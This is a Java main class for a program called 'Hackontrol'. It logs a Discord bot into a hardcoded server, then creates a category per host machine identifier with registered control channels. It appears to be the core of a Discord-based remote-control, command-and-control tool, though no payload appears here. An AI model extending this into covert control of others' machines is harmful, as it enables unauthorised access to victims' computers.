package com.khopan.hackontrol;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.khopan.hackontrol.manager.Manager;
import com.khopan.hackontrol.registration.ChannelRegistry;
import com.khopan.hackontrol.registration.ManagerRegistry;
import com.khopan.hackontrol.registry.RegistrationHandler;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.registry.RegistryType;
import com.khopan.hackontrol.utils.DiscordUtils;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.channel.concrete.Category;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.requests.GatewayIntent;

public class Hackontrol {
	public static final RegistryType<Void, Class<? extends Manager>> MANAGER_REGISTRY = RegistryType.create();
	public static final RegistryType<Void, Class<? extends HackontrolChannel>> CHANNEL_REGISTRY = RegistryType.create();

	public static final String NAME = "Hackontrol";
	public static final Logger LOGGER = LoggerFactory.getLogger(Hackontrol.NAME);

	private static Hackontrol INSTANCE;

	private final List<Manager> managerList;
	private final List<HackontrolChannel> channelList;
	private final RegistrationHandler registrationHandler;
	private final JDA bot;
	private final Guild guild;
	private final Category category;

	private Hackontrol() {
		Hackontrol.INSTANCE = this;
		StrictClassValueOnlyRegistryImplementation<Manager> managerRegistryImplementation = StrictClassValueOnlyRegistryImplementation.create(Hackontrol.MANAGER_REGISTRY, Manager.class);
		ManagerRegistry.register(managerRegistryImplementation);
		this.managerList = managerRegistryImplementation.getList();
		StrictClassValueOnlyRegistryImplementation<HackontrolChannel> channelRegistryImplementation = StrictClassValueOnlyRegistryImplementation.create(Hackontrol.CHANNEL_REGISTRY, HackontrolChannel.class);
		ChannelRegistry.register(channelRegistryImplementation);
		this.channelList = channelRegistryImplementation.getList();
		this.channelList.forEach(channel -> Hackontrol.LOGGER.info("Registered channel: {}", channel.getClass().getName()));
		this.registrationHandler = new RegistrationHandler();
		JDABuilder builder = JDABuilder.createDefault(Token.BOT_TOKEN).enableIntents(GatewayIntent.MESSAGE_CONTENT);
		this.managerList.forEach(manager -> manager.configureBuilder(builder));
		this.bot = builder.build();

		try {
			this.bot.awaitReady();
		} catch(Throwable Errors) {
			throw new RuntimeException();
		}

		this.guild = this.bot.getGuildById(1173967259304198154L);
		String identifier = Machine.getIdentifier();
		this.category = DiscordUtils.getOrCreateCategory(this.guild, identifier);

		for(int i = 0; i < this.channelList.size(); i++) {
			HackontrolChannel hackontrolChannel = this.channelList.get(i);
			String channelName = hackontrolChannel.getName();
			TextChannel channel = DiscordUtils.getOrCreateTextChannelInCategory(this.category, channelName);
			hackontrolChannel.channel = channel;
			hackontrolChannel.register(this.registrationHandler.createRegistry(hackontrolChannel));

			if(DiscordUtils.isChannelEmpty(channel)) {
				hackontrolChannel.initialize();
			}
		}

		this.managerList.forEach(manager -> manager.initialize(this.registrationHandler));
	}

	public Category getCategory() {
		return this.category;
	}

	public HackontrolChannel getHackontrolChannel(TextChannel channel) {
		if(channel == null) {
			return null;
		}

		for(int i = 0; i < this.channelList.size(); i++) {
			HackontrolChannel hackontrolChannel = this.channelList.get(i);

			if(channel.equals(hackontrolChannel.channel)) {
				return hackontrolChannel;
			}
		}

		return null;
	}

	public static void main(String[] args) throws Throwable {
		Hackontrol.LOGGER.info("Initializing");
		Hackontrol.getInstance();
	}

	public static Hackontrol getInstance() {
		if(Hackontrol.INSTANCE == null) {
			Hackontrol.INSTANCE = new Hackontrol();
		}

		return Hackontrol.INSTANCE;
	}

	private static class StrictClassValueOnlyRegistryImplementation<V> implements Registry {
		private final RegistryType<?, ?> allowedType;
		private final List<V> list;

		private StrictClassValueOnlyRegistryImplementation(RegistryType<?, ?> allowedType) {
			this.allowedType = allowedType;
			this.list = new ArrayList<>();
		}

		@Override
		public <T, U> void register(RegistryType<T, U> type, T identifier, U value) {
			this.register(type, value);
		}

		@SuppressWarnings("unchecked")
		@Override
		public <U> void register(RegistryType<?, U> type, U value) {
			if(!this.allowedType.equals(type)) {
				throw new IllegalArgumentException("Invalid registry type");
			}

			if(value == null) {
				return;
			}

			if(!(value instanceof Class)) {
				throw new IllegalArgumentException("Invalid value type");
			}

			Class<V> valueAsClass = (Class<V>) value;

			try {
				V valueInstance = valueAsClass.getDeclaredConstructor().newInstance();
				this.list.add(valueInstance);
			} catch(Throwable Errors) {
				throw new RuntimeException(Errors);
			}
		}

		public List<V> getList() {
			return Collections.unmodifiableList(this.list);
		}

		public static <V> StrictClassValueOnlyRegistryImplementation<V> create(RegistryType<?, ?> allowedType, Class<V> valueType) {
			return new StrictClassValueOnlyRegistryImplementation<V>(allowedType);
		}
	}
}
